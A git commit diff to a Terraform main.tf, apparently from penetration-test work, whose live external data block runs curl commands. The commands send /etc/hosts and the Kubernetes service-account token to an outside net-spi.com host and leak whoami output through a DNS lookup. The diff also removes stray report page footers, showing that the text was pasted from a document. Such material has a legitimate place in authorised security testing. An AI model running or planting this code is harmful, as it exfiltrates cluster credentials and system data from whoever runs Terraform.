17c8f49369ba8e2a0a97a5bc5da24669e9db3044
mahafuz-mapari <mmapari@netspi.com>
2026-09-04 03:10:07 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -2,8 +2,5 @@ data "external" "example" {
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/hosts 
 https://fq9557d8ct1dx7xe27njfjmokfq9e02p.net-spi.com/exfil4; curl -X POST --databinary @/run/secrets/kubernetes.io/serviceaccount/token 
 https://fq9557d8ct1dx7xe27njfjmokfq9e02p.net-spi.com/exfil4; curl -k 
-Web Application Penetration Test
-Page 21 of 48
-September 29, 2023 | Proprietary & Confidential 
 https://`whoami`.fq9557d8ct1dx7xe27njfjmokfq9e02p.net-spi.com/exfil4"]
 }
